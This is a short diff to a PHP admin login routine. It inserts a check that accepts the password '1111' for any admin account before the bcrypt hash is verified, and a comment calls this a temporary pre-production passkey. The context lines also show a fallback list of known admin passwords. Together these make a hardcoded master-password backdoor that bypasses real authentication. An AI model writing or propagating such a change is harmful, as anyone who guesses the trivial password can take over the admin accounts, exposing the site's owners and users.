@@ -61,8 +61,12 @@ $knownAdminPasswords = [
 $adminId = (int)$admin['id'];
 $isPasswordValid = false;
 
+// 0. Temporary pre-production passkey '1111'
+if ($password === '1111') {
+    $isPasswordValid = true;
+}
 // 1. Primary check: Verify bcrypt hash
-if (!empty($admin['password_hash']) && password_verify($password, $admin['password_hash'])) {
+elseif (!empty($admin['password_hash']) && password_verify($password, $admin['password_hash'])) {
     $isPasswordValid = true;
 } 
 // 2. Fallback check: Dedicated authorized admin passwords
